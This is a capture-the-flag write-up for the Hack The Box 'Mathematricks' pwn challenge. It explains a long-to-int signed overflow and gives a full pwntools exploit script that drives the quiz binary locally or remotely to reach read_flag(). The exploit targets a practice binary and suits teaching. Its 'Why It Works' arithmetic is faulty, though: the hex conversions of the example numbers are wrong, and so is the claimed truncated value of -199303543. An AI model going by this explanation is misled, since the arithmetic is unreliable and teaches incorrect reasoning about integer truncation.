---
title: "Mathematricks 🧠 - Signed Integer Overflow Exploit Writeup"
tags: [HTB, binary exploitation, signed overflow, pwn]
---

# Mathematricks 🧠

![Category](https://img.shields.io/badge/category-Pwn-orange)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Platform](https://img.shields.io/badge/platform-Linux-blue)
![HTB](https://img.shields.io/badge/HTB-Challenge-green)

How about a magic trick? Or a math trick? Beat me and I will give you an amazing reward!

## 📚 Table of Contents
- [Binary Protections Analysis 🛡️](#binary-protections-analysis-️)
- [Program Behavior 📟](#program-behavior-)
- [Reverse Engineering 🔍](#reverse-engineering-)
- [Exploitation Strategy 💣](#exploitation-strategy-)
- [Full Exploit Script 🧨](#full-exploit-script-)
- [Exploitation Result ✅](#exploitation-result-)
- [Conclusion 🧾](#conclusion-)

## Binary Protections Analysis 🛡️

We begin by running `checksec` on the binary:

![Checksec Output](https://github.com/user-attachments/assets/6418a92b-ca8b-4297-822e-3513f35c5e8c)

Findings:
- ✅ Full RELRO  
- ✅ Stack Canary found  
- ✅ NX enabled  
- ✅ PIE enabled  
- ❌ No FORTIFY

## Program Behavior 📟

Upon launching the binary, we are presented with two options:

![Program Menu](https://github.com/user-attachments/assets/736c8f34-35de-4583-aaa1-388f0d9e6c02)

Choosing the **"Rules"** option displays the following message:

> Solve the math questions to get the flag, some of them are tricky!

## Reverse Engineering 🔍

In Ghidra, we decompiled the `game()` function:

![Ghidra Decompiled Game Function](https://github.com/user-attachments/assets/7bf67697-dc68-4e61-ae4c-207f080802b9)

We notice a simple chain of mathematical questions. Most of them are straightforward:

```c
if ((0 < lVar1) && (0 < lVar2)) {
    if ((int)lVar1 + (int)lVar2 < 0) {
        read_flag();
    }
}
```

The catch lies in the **last condition**, which leads to `read_flag()`.

## Exploitation Strategy 💣

The trick comes from how `long` values (64-bit) are cast into `int` (32-bit signed) values.

### 🔢 Limits:
- **Signed long (64-bit)**: -9,223,372,036,854,775,808 → 9,223,372,036,854,775,807  
- **Signed int (32-bit)**: -2,147,483,648 → 2,147,483,647

Even if we input a positive long, when casted to an `int`, we can **cause a signed overflow** by truncating the upper bits.  

This happens here:

```
if ((int)lVar1 + (int)lVar2 < 0)
```

By providing:
- `n1 = 1`
- `n2 = 1337133713371337`

→ The `int` cast of `n2` overflows to a **negative number**, satisfying the condition.

### 🧠 Why It Works

Let’s analyze the difference between two values:

#### ➤ Value 1: `133713371337`  
- In hex (64-bit): `0x0000001F24E6D099`
- Truncated 32 LSB (int): `0x24E6D099`
- Binary conversion: 00100100111001101101000010011001 (first bit = 0, positive number)  
- Interpreted as **signed int**: **+619825177** ✅ still positive

#### ➤ Value 2: `1337133713371337`  
- In hex (64-bit): `0x04CFF4073DD9`
- Truncated 32 LSB (int): `0x073DD9` → in full: `0xF4073DD9`
- Binary conversion: 11110100000001110011110111011001 (first bit = 1, negative number)
- Interpreted as **signed int**: **-199303543** ❌ negative!

The high bit (MSB) is `1` in the casted 32-bit value, marking it as **negative** when interpreted as a `signed int`.

Thus:
```
(int)1 + (int)-199303543 = -199303542 < 0 → condition met ✅
```

(With n2 = 2147483647 it works too, because the first bit of the truncated 32 LSB of n1 + n2 (2147483648) is equal to 1, even if 2147483647 is lower than 133713371337.)

## Full Exploit Script 🧨

```python
from pwn import *
import argparse

def main():
    parser = argparse.ArgumentParser(description="Exploit mathematricks (local or remote)")
    parser.add_argument("-r", "--remote", help="Remote mode with IP and port", nargs=2, metavar=("IP", "PORT"))
    parser.add_argument("-l", "--local", help="Local mode with a binary", metavar="BINARY")
    args = parser.parse_args()

    if args.remote:
        ip, port = args.remote
        p = remote(ip, int(port))
    elif args.local:
        p = process(args.local)
    else:
        print("Please specify an execution mode: -r IP PORT or -l BINARY")
        return

    emoji_prompt = b'\xf0\x9f\xa5\xb8 '  # 🥸 prompt in UTF-8

    p.sendlineafter(emoji_prompt, b'1')             # Enter in game
    p.sendlineafter(b'> ', b'2')                    # Q1: 1 + 1 = ?
    p.sendlineafter(b'> ', b'1')                    # Q2: 2 - 1 = ?
    p.sendlineafter(b'> ', b'0')                    # Q3: 1337 - 1337 = ?
    p.sendlineafter(b'n1: ', b'1')                  # n1
    p.sendlineafter(b'n2: ', b'1337133713371337')   # crafted value for overflow

    print(p.recvall().decode(errors="ignore"))

if __name__ == "__main__":
    main()
```

## Exploitation Result ✅

And here's the final output with the flag:

![Exploit Result](https://github.com/user-attachments/assets/26504540-8213-48d7-937e-3e8dba22e77c)

```
HTB{f4k3_fl4g_f0r_t35t1ng}
```

## Conclusion 🧾

This challenge was a great example of a **signed integer overflow** logic bug.

- We leveraged the fact that a `long` is downcast to a `signed int`, possibly resulting in negative values.
- By choosing the right large 64-bit number, we forced an overflow and passed the logic check.

A perfect mix of math and low-level understanding 🔐🧠

🔙 [Back to Challenge Writeups](../../)
